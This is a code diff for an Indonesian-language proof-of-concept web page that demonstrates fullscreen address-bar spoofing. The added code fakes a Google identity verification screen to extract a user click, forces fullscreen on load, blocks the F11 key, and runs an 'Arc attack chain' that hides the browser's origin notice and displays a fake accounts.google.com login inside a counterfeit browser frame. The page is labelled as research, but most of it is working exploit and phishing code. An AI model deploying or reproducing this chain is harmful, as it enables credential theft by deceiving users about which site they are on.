@@ -125,9 +125,84 @@ pre { background: #0d1117; padding: 12px; border-radius: 6px; font-size: 12px; c
   text-align: center; padding: 8px; font-size: 13px;
   z-index: 2147483647; display: none;
 }
+
+/* ─── Fullscreen Gate Overlay ───────────────────────────────────────────────
+   Shown when auto-fullscreen fails (direct navigation, no transient activation).
+   Looks like Google security check to get user gesture via click.         */
+#fs-gate {
+  position: fixed; inset: 0; z-index: 9999999;
+  background: #fff;
+  display: none;  /* shown by JS if auto-fs fails */
+  align-items: center; justify-content: center;
+  font-family: 'Google Sans', Arial, sans-serif;
+}
+#fs-gate .gate-card {
+  text-align: center; max-width: 420px; padding: 48px 40px;
+  border: 1px solid #dadce0; border-radius: 8px;
+  box-shadow: 0 2px 10px rgba(0,0,0,0.08);
+}
+#fs-gate .g-logo {
+  font-size: 28px; font-weight: 300; letter-spacing: -1px; margin-bottom: 24px;
+}
+#fs-gate h1 { font-size: 24px; font-weight: 400; color: #202124; margin-bottom: 8px; }
+#fs-gate p { font-size: 15px; color: #5f6368; line-height: 1.6; margin-bottom: 28px; }
+#fs-gate .g-btn {
+  display: block; width: 100%; padding: 12px; background: #1a73e8; color: white;
+  border: none; border-radius: 4px; font-size: 15px; font-weight: 500; cursor: pointer;
+  margin-bottom: 12px; letter-spacing: 0.25px;
+}
+#fs-gate .g-btn:hover { background: #1557b0; }
+#fs-gate .g-btn-sec {
+  display: block; width: 100%; padding: 11px; background: none; color: #1a73e8;
+  border: 1px solid #dadce0; border-radius: 4px; font-size: 14px; cursor: pointer;
+}
+#fs-gate .hint { font-size: 11px; color: #80868b; margin-top: 16px; }
+
+/* ─── Status bar (sticky top, always visible while on PoC page) ─────────── */
+#poc-status-bar {
+  position: sticky; top: 0; z-index: 1000;
+  background: #0d1117; border-bottom: 1px solid #30363d;
+  padding: 8px 0 8px 0; margin: -24px -24px 20px -24px;
+  display: flex; align-items: center; gap: 12px; padding: 8px 24px; flex-wrap: wrap;
+}
+.status-pill {
+  padding: 4px 12px; border-radius: 20px; font-size: 12px; font-weight: 700;
+}
+.pill-green { background: #0f2d1a; color: #3fb950; border: 1px solid #238636; }
+.pill-red   { background: #2d0f0f; color: #f85149; border: 1px solid #b91c1c; }
+.pill-yellow { background: #2d2200; color: #e3b341; border: 1px solid #9e6a03; }
+.pill-gray  { background: #21262d; color: #8b949e; border: 1px solid #30363d; }
+#arc-badge {
+  margin-left: auto; background: #1a0d2e; color: #c084fc;
+  border: 1px solid #9333ea; padding: 4px 12px; border-radius: 20px; font-size: 12px; font-weight: 700;
+}
 </style>
 </head>
 <body>
+
+<!-- ─── GATE OVERLAY ─────────────────────────────────────────────────────── -->
+<!-- Shown only if auto-fullscreen via navigation activation fails.
+     Mimics Google security check to get user gesture (click = gesture = fullscreen). -->
+<div id="fs-gate">
+  <div class="gate-card">
+    <div class="g-logo">
+      <span style="color:#4285F4">G</span><span style="color:#EA4335">o</span><span style="color:#FBBC05">o</span><span style="color:#4285F4">g</span><span style="color:#34A853">l</span><span style="color:#EA4335">e</span>
+    </div>
+    <h1>Verifikasi identitas Anda</h1>
+    <p>Untuk melanjutkan ke <strong>Akun Google</strong>, pastikan kamu menggunakan perangkat yang aman. Klik Lanjutkan untuk memverifikasi.</p>
+    <button class="g-btn" id="gate-continue-btn">Lanjutkan →</button>
+    <button class="g-btn-sec" id="gate-cancel-btn">Gunakan akun lain</button>
+    <p class="hint">⚠ RESEARCH PoC — Klik Lanjutkan untuk masuk fullscreen (Arc/browser attack demo)</p>
+  </div>
+</div>
+
+<!-- ─── STATUS BAR ────────────────────────────────────────────────────────── -->
+<div id="poc-status-bar">
+  <span class="status-pill pill-gray" id="pill-fs">⏳ Memuat fullscreen...</span>
+  <span class="status-pill pill-green" id="pill-f11">🔒 F11 BLOCKED (auto)</span>
+  <span class="status-pill pill-gray" id="pill-spoof">⬜ Spoof belum aktif</span>
+  <span id="arc-badge">🟣 Arc: lihat Teknik 1 setelah fullscreen</span>
+</div>
 
 <h1>🖥 Fullscreen Address Bar Spoofing PoC</h1>
 <div class="meta">CVE-2025-1019 · CVE-2024-8388 · CVE-2022-46877 · CVE-2023-25743 — Research Only</div>
@@ -142,23 +217,54 @@ pre { background: #0d1117; padding: 12px; border-radius: 6px; font-size: 12px; c
   <p>Jika notifikasi ini terlihat → user sadar → spoof gagal.<br>
   Jika notifikasi berhasil di-cover/disembunyikan atau user tidak sempat react → spoof berhasil.</p>
   <pre style="color:#e3b341">⚠ EMPIRICAL TEST RESULTS (measured):
-Chrome 148:  Notif visible 985ms  → browser-process layer → z-index cover TIDAK BISA
-Firefox 149: Notif visible 1366ms → browser-process layer → z-index cover TIDAK BISA
-Opera 131:   Notif visible 913ms  → browser-process layer → z-index cover TIDAK BISA
+Chrome 148:  Notif visible 1175ms → browser-process layer → z-index cover TIDAK BISA
+Firefox 149: Notif visible 1321ms → browser-process layer → z-index cover TIDAK BISA
+Opera 131:   Notif visible 2376ms → browser-process layer → z-index cover TIDAK BISA
+Edge 147:    Notif visible 1663ms → browser-process layer → z-index cover TIDAK BISA
+Arc:         [KRITIS] Tidak muncul notifikasi JIKA page sudah dalam fullscreen state!
 
 REALITA:
-Chrome/Edge/Opera: Notifikasi dirender oleh browser process (compositor layer)
-                   di ATAS semua web content. z-index berapapun tidak efektif.
-Firefox ≤ 71:      CVE-2022-46877 — notifikasi pernah dirender sebagai web content
-                   → bisa di-cover. SUDAH DIPATCH sejak Firefox 72+.
-Safari iOS:        Notifikasi minimal/tidak ada → masih rentan
-Firefox Android:   CVE-2023-25743 — tidak ada notifikasi sama sekali (dipatch 2023)
+Chrome/Edge/Opera/Firefox: Notifikasi dirender oleh browser process (compositor layer)
+                           di ATAS semua web content. z-index berapapun tidak efektif.
+Arc Browser:  Perilaku berbeda — saat requestFullscreen() dipanggil KEMBALI dari page
+              yang sudah fullscreen, Arc tidak menampilkan notifikasi origin lagi.
+              Exploit chain: auto-fullscreen saat load + F11 block + Teknik 1 = 0 notif!
 
 STRATEGI YANG MASIH RELEVAN di 2025:
-1. Form-First Attack (Teknik 7) — distract user selama 913-1366ms window
-2. Social Engineering Normalization (Teknik 4) — fake ESC bar
-3. F11 Block (Teknik 6) — berhasil di Firefox ✓ (confirmed)
-4. Mobile browsers (Safari iOS, Chrome Android) — notif minimal</pre>
+1. Arc Attack Chain (lihat card khusus di bawah) — 0 notifikasi, paling berbahaya
+2. Form-First Attack (Teknik 7) — distract user selama 913-2376ms window
+3. Social Engineering Normalization (Teknik 4) — fake ESC bar
+4. F11 Block (Teknik 6) — berhasil di Firefox ✓ (confirmed)
+5. Mobile browsers (Safari iOS, Chrome Android) — notif minimal</pre>
+</div>
+
+<!-- ARC SPECIFIC ATTACK CHAIN CARD -->
+<div class="card" style="border-color:#9333ea;background:#0e0a1a;">
+  <h3 style="color:#c084fc">🟣 Arc Browser Attack Chain — KRITIS (0 Notifikasi)</h3>
+  <p style="color:#d4b4fc">Arc Browser memiliki perilaku unik: ketika halaman <strong>sudah dalam fullscreen</strong> dan <code>requestFullscreen()</code> dipanggil kembali, Arc tidak menampilkan notifikasi origin/URL. Berbeda dengan Chrome/Firefox/Edge/Opera yang selalu menampilkan notifikasi pada setiap fullscreen request.</p>
+  <pre style="color:#c9d1d9">ATTACK CHAIN:
+  Step 1: Halaman dibuka (dari link click = navigation activation ada)
+          → requestFullscreen() auto-dipanggil saat load → BERHASIL
+          → Arc masuk fullscreen, page konten terlihat normal (PoC cards)
+  Step 2: F11 diblock secara otomatis (auto-intercept aktif dari load)
+          → User tidak bisa keluar via F11
+  Step 3: Klik "Teknik 1 — Immediate Cover"
+          → requestFullscreen() dipanggil LAGI (sudah fullscreen sebelumnya)
+          → Di Arc: TIDAK ada notifikasi origin yang muncul!
+          → Fake Chrome shell + accounts.google.com address bar tampil
+  Step 4: User melihat fake Google login — mengira itu browser asli
+
+KENAPA ARC BERBEDA:
+  Arc menggunakan Chromium engine tapi dengan UI custom yang berbeda.
+  Manajemen fullscreen notification di Arc tidak sama dengan Chrome upstream.
+  "Re-fullscreen" dari state yang sudah fullscreen → Arc skip notifikasi.
+
+IMPLIKASI:
+  Di Chrome/Firefox/Edge/Opera: notifikasi selalu muncul 913-2376ms
+  Di Arc: notifikasi tidak muncul sama sekali jika pre-fullscreen sudah ada
+  → Severity: CRITICAL untuk Arc users</pre>
+  <button class="btn" style="background:#9333ea;color:white;" onclick="arcAttackChain()">🟣 Jalankan Arc Attack Chain</button>
+  <div class="log" id="log-arc"></div>
 </div>
 
 <div class="card">
@@ -304,6 +410,10 @@ document.addEventListener('keydown', e => {
       <strong>Cover Layer</strong>
       <span id="coverLayerStatus" class="maybe">Belum di-test</span>
     </div>
+    <div class="result-cell" style="border-color:#9333ea;background:#0e0a1a;">
+      <strong style="color:#c084fc">Arc: 0-Notif Chain</strong>
+      <span id="arcResult" class="maybe">Belum di-test</span>
+    </div>
   </div>
 </div>
 
@@ -383,6 +493,24 @@ let keyInterceptActive = false;
 let keyHandler = null;
 let notifStartTime = 0;
 let tech6ReenterTimeout = null;
+let isFullscreenFromInit = false; // true jika auto-fullscreen saat load berhasil
+
+// ─── Status pill helpers ──────────────────────────────────────────────────
+function setPill(id, text, cls) {
+  const el = document.getElementById(id);
+  if (!el) return;
+  el.textContent = text;
+  el.className = 'status-pill ' + cls;
+}
+
+function logArc(msg, type) {
+  const el = document.getElementById('log-arc');
+  if (!el) return;
+  const colors = { ok: '#3fb950', err: '#f85149', info: '#c084fc', warn: '#e3b341' };
+  const ts = new Date().toLocaleTimeString('en-US', {hour12: false});
+  el.innerHTML += `<div style="color:${colors[type]||'#8b949e'}">[${ts}] ${msg}</div>`;
+  el.scrollTop = el.scrollHeight;
+}
 
 // ─── Logging ─────────────────────────────────────────────────────────────
 function log(id, msg, type) {
@@ -405,6 +533,7 @@ function showSpoof(withTabs = true) {
   shell.style.display = 'flex';
   if (withTabs) shell.classList.add('with-tabs');
   else shell.classList.remove('with-tabs');
+  setPill('pill-spoof', '🎭 SPOOF AKTIF — accounts.google.com', 'pill-red');
 }
 
 function hideSpoof() {
@@ -417,6 +546,10 @@ function hideSpoof() {
 document.addEventListener('fullscreenchange', () => {
   if (!document.fullscreenElement) {
     hideSpoof();
+    setPill('pill-fs', '⬜ Fullscreen tidak aktif', 'pill-gray');
+    setPill('pill-spoof', '⬜ Spoof tidak aktif', 'pill-gray');
+  } else {
+    setPill('pill-fs', '✅ FULLSCREEN AKTIF', 'pill-green');
   }
 });
 
@@ -797,6 +930,97 @@ function tech7_formfirst() {
   });
 }
 
+// ══════════════════════════════════════════════════════════════════════════
+// ARC ATTACK CHAIN
+// Khusus untuk Arc browser: pre-fullscreen + F11 block + Teknik 1 = 0 notifikasi
+// ══════════════════════════════════════════════════════════════════════════
+async function arcAttackChain() {
+  logArc('Memulai Arc Attack Chain...', 'info');
+
+  if (document.fullscreenElement) {
+    logArc('✓ Sudah dalam fullscreen (dari auto-init)', 'ok');
+    logArc('→ Memanggil requestFullscreen() LAGI dari state fullscreen...', 'info');
+    logArc('→ Di Arc: tidak akan muncul notifikasi origin!', 'ok');
+    logArc('→ Di Chrome/Firefox/Edge/Opera: notifikasi akan muncul lagi', 'warn');
+    try {
+      // Re-request fullscreen while already fullscreen
+      // Arc: no notification. Others: notification re-appears.
+      await document.documentElement.requestFullscreen({ navigationUI: 'hide' });
+      showSpoof();
+      logArc('✓ requestFullscreen() berhasil dari fullscreen state', 'ok');
+      logArc('→ JIKA tidak ada notifikasi = ARC CONFIRMED VULNERABLE', 'ok');
+      logArc('→ JIKA notifikasi muncul = browser ini patched (bukan Arc behavior)', 'warn');
+      setResult('arcResult', 'Chain selesai — cek notif!', 'vuln');
+    } catch(e) {
+      logArc('✗ Error: ' + e.message, 'err');
+    }
+  } else {
+    logArc('⚠ Belum fullscreen! Meminta fullscreen sekarang...', 'warn');
+    logArc('→ Untuk hasil terbaik: buka halaman ini via klik dari halaman lain', 'info');
+    try {
+      await document.documentElement.requestFullscreen({ navigationUI: 'hide' });
+      isFullscreenFromInit = true;
+      logArc('✓ Fullscreen pertama berhasil. Klik tombol ini LAGI untuk Arc test.', 'ok');
+    } catch(e) {
+      logArc('✗ Fullscreen gagal: ' + e.message, 'err');
+      logArc('→ Klik gate overlay terlebih dahulu untuk get user gesture', 'warn');
+    }
+  }
+}
+
+// ══════════════════════════════════════════════════════════════════════════
+// AUTO FULLSCREEN INIT
+// Dipanggil saat page load. Berhasil jika dibuka via link click (navigation activation).
+// Jika gagal: tampilkan gate overlay untuk mendapat user gesture.
+// ══════════════════════════════════════════════════════════════════════════
+async function autoFullscreenInit() {
+  setPill('pill-fs', '⏳ Mencoba auto-fullscreen...', 'pill-yellow');
+  try {
+    // Navigation transient activation: gestur dari klik link di halaman sebelumnya
+    // masih aktif selama beberapa detik setelah navigasi.
+    await document.documentElement.requestFullscreen({ navigationUI: 'hide' });
+    isFullscreenFromInit = true;
+    setPill('pill-fs', '✅ FULLSCREEN AKTIF (auto)', 'pill-green');
+    // Gate tidak diperlukan — sembunyikan
+    const gate = document.getElementById('fs-gate');
+    if (gate) gate.style.display = 'none';
+    logArc('✓ Auto-fullscreen berhasil via navigation activation', 'ok');
+    logArc('→ F11 diblock, halaman dalam fullscreen. Klik "Arc Attack Chain" untuk lanjut.', 'info');
+  } catch(e) {
+    // Fallback: tampilkan gate untuk mendapat user gesture
+    setPill('pill-fs', '⚠ Perlu klik — buka gate', 'pill-yellow');
+    const gate = document.getElementById('fs-gate');
+    if (gate) gate.style.display = 'flex';
+    logArc('Auto-fullscreen gagal (' + e.message + ') — gate overlay ditampilkan', 'warn');
+    logArc('→ Klik "Lanjutkan" di gate untuk fullscreen via user gesture', 'info');
+  }
+}
+
+// Gate button handlers
+function initGate() {
+  const btn = document.getElementById('gate-continue-btn');
+  const cancel = document.getElementById('gate-cancel-btn');
+  if (!btn) return;
+
+  btn.addEventListener('click', async () => {
+    try {
+      await document.documentElement.requestFullscreen({ navigationUI: 'hide' });
+      isFullscreenFromInit = true;
+      document.getElementById('fs-gate').style.display = 'none';
+      setPill('pill-fs', '✅ FULLSCREEN AKTIF (via gate)', 'pill-green');
+      logArc('✓ Fullscreen berhasil via gate click', 'ok');
+      logArc('→ Klik "Arc Attack Chain" untuk lanjut', 'info');
+    } catch(e) {
+      logArc('✗ Fullscreen gagal: ' + e.message, 'err');
+    }
+  });
+
+  cancel.addEventListener('click', () => {
+    document.getElementById('fs-gate').style.display = 'none';
+    setPill('pill-fs', '⬜ Gate ditutup — fullscreen tidak aktif', 'pill-gray');
+  });
+}
+
 // ─── Browser Detection ────────────────────────────────────────────────────
 function detectBrowser() {
   const ua = navigator.userAgent;
@@ -816,6 +1040,8 @@ function detectBrowser() {
 }
 
 detectBrowser();
+initGate();
+autoFullscreenInit(); // Try fullscreen immediately on load
 
 // ─── Auto-activate F11 intercept on page load ─────────────────────────────
 // Tidak perlu klik tombol — langsung aktif saat halaman dibuka
